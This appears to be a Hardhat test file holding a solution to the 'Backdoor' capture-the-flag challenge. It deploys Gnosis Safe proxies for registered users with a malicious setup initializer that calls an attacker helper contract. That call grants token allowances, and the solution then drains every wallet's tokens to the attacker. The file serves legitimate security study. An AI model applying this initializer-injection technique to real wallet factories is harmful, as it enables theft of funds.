const { ethers } = require("hardhat");
const { expect } = require("chai");

describe("[Challenge] Backdoor", function () {
  let deployer, users, attacker;

  const AMOUNT_TOKENS_DISTRIBUTED = ethers.utils.parseEther("40");

  before(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    [deployer, alice, bob, charlie, david, attacker] =
      await ethers.getSigners();
    users = [alice.address, bob.address, charlie.address, david.address];

    // Deploy Gnosis Safe master copy and factory contracts
    this.masterCopy = await (
      await ethers.getContractFactory("GnosisSafe", deployer)
    ).deploy();
    this.walletFactory = await (
      await ethers.getContractFactory("GnosisSafeProxyFactory", deployer)
    ).deploy();
    this.token = await (
      await ethers.getContractFactory("DamnValuableToken", deployer)
    ).deploy();

    // Deploy the registry
    this.walletRegistry = await (
      await ethers.getContractFactory("WalletRegistry", deployer)
    ).deploy(
      this.masterCopy.address,
      this.walletFactory.address,
      this.token.address,
      users
    );

    // Users are registered as beneficiaries
    for (let i = 0; i < users.length; i++) {
      expect(await this.walletRegistry.beneficiaries(users[i])).to.be.true;
    }

    // Transfer tokens to be distributed to the registry
    await this.token.transfer(
      this.walletRegistry.address,
      AMOUNT_TOKENS_DISTRIBUTED
    );
  });

  it("Exploit", async function () {
    /** CODE YOUR EXPLOIT HERE */
    const attackerHelper = await (
      await ethers.getContractFactory("BackdoorAttacker", attacker)
    ).deploy(attacker.address, this.token.address);

    console.log(deployer.address);
    console.log(attacker.address);
    console.log(attackerHelper.address);
    console.log(this.walletFactory.address);

    const iface = this.masterCopy.interface;
    for (let i = 0, len = users.length; i < len; i++) {
      const user = users[i];
      const initializer = iface.encodeFunctionData("setup", [
        [user],
        1,
        // ethers.constants.AddressZero,  // to
        attackerHelper.address, // to
        // ethers.constants.AddressZero,  // data
        attackerHelper.interface.encodeFunctionData("attack", []), // data
        // ethers.constants.AddressZero, // fallback
        attackerHelper.address, // fallback
        this.token.address,
        0,
        ethers.constants.AddressZero,
      ]);

      const tx = await this.walletFactory
        .connect(attacker)
        .createProxyWithCallback(
          this.masterCopy.address,
          initializer,
          42, // Salt
          this.walletRegistry.address
        );
      const receipt = await tx.wait();

      // console.log(receipt);
      // console.dir(receipt, { depth: null })

      console.log(this.token.interface.parseLog(receipt.logs[0]));

      const wallet = await this.walletRegistry.wallets(user);
      console.log("Wallet: ", wallet);
      console.log(
        "Wallet balance: ",
        (await this.token.balanceOf(wallet)).toString()
      );

      // await this.token
      //   .connect(attacker)
      //   .transferFrom(wallet, attacker.address, ethers.utils.parseEther("1"));

      const allowance = await this.token.allowance(wallet, attacker.address);
      console.log("allowance: ", allowance.toString());

      await this.token.connect(attacker).transferFrom(
        wallet,
        attacker.address,
        allowance
      );

      // await attacker.sendTransaction({
      //   to: attackerHelper.address,
      //   data: 0,
      //   gasLimit: 1e6
      // });

      // await attacker.sendTransaction({
      //   to: wallet,
      //   data: 0,
      //   gasLimit: 1e6,
      // });
    }
  });

  after(async function () {
    /** SUCCESS CONDITIONS */
    for (let i = 0; i < users.length; i++) {
      let wallet = await this.walletRegistry.wallets(users[i]);

      // User must have registered a wallet
      expect(wallet).to.not.eq(
        ethers.constants.AddressZero,
        `User ${i} did not register a wallet`
      );

      // User is no longer registered as a beneficiary
      expect(await this.walletRegistry.beneficiaries(users[i])).to.be.false;
    }

    // Attacker must have taken all tokens
    expect(await this.token.balanceOf(attacker.address)).to.eq(
      AMOUNT_TOKENS_DISTRIBUTED
    );
  });
});
